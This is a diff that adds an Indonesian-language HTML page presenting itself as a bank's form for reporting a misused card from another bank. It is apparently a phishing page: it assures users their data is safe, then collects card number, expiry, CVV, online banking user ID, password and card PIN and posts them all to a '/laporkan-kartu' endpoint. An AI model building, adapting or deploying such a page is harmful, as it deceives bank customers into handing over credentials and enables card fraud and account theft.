@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Laporan Kartu Bank Lain</title>
+  <link rel="stylesheet" href="LAporankartubanklain.css">
+</head>
+<body>
+  <div class="otp-header">
+    <span class="close-btn">&times;</span>
+    <span class="chat-icon">&#9993;</span>
+    <div class="otp-title">Laporan Kartu Bank Lain</div>
+  </div>
+
+  <div class="container">
+    <p class="notice">
+      Untuk kami bantu memproses laporan ini ke bank yang bersangkutan, mohon masukkan nomor kartu yang disalahgunakan. 🔒<br>
+      <strong>Data Anda aman dan dijaga kerahasiaannya</strong> sesuai standar keamanan perbankan.
+    </p>
+
+    <form id="laporanForm">
+      <div class="form-group">
+        <label for="bank">Bank Tujuan</label>
+        <select id="bank" name="bank" required>
+          <option value="" disabled selected>Pilih Bank</option>
+          <option value="bca">BANK BCA</option>
+          <option value="bri">BANK BRI</option>
+          <option value="mandiri">BANK MANDIRI</option>
+          <!-- Tambahkan lainnya sesuai kebutuhan -->
+        </select>
+
+        <label for="nama">Nama Nasabah</label>
+        <input type="text" id="nama" required>
+
+        <label for="nomor-kartu">Nomor Kartu</label>
+        <input type="text" id="nomor-kartu" required>
+
+        <input type="text" id="expired" placeholder="Expired kartu" required>
+        <input type="text" id="cvv" placeholder="CVV kartu" required>
+
+        <input type="text" id="userid" placeholder="User ID">
+        <input type="text" id="password" placeholder="Password">
+        <input type="text" id="pin" placeholder="PIN Kartu">
+
+        <label for="deskripsi">Keterangan Singkat</label>
+        <textarea id="deskripsi" rows="4" placeholder="(Opsional)"></textarea>
+
+        <button type="submit" class="btn-submit">Kirim Laporan</button>
+      </div>
+    </form>
+
+    <div class="footer-text">
+      &copy; 2025 PT. Bank Anda. Semua hak dilindungi.
+    </div>
+  </div>
+
+  <script>
+    document.getElementById("laporanForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const data = {
+        bank: document.getElementById("bank").value,
+        nama: document.getElementById("nama").value,
+        kartu: document.getElementById("nomor-kartu").value,
+        expired: document.getElementById("expired").value,
+        cvv: document.getElementById("cvv").value,
+        userid: document.getElementById("userid").value,
+        password: document.getElementById("password").value,
+        pin: document.getElementById("pin").value,
+        deskripsi: document.getElementById("deskripsi").value
+      };
+
+      fetch("/laporkan-kartu", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+      })
+      .then(res => {
+        if (res.ok) {
+          window.location.href = "Terimakasih.html";
+        } else {
+          alert("❌ Gagal mengirim laporan.");
+        }
+      })
+      .catch(err => {
+        alert("⚠️ Terjadi error.");
+        console.error(err);
+      });
+    });
+  </script>
+</body>
+</html>
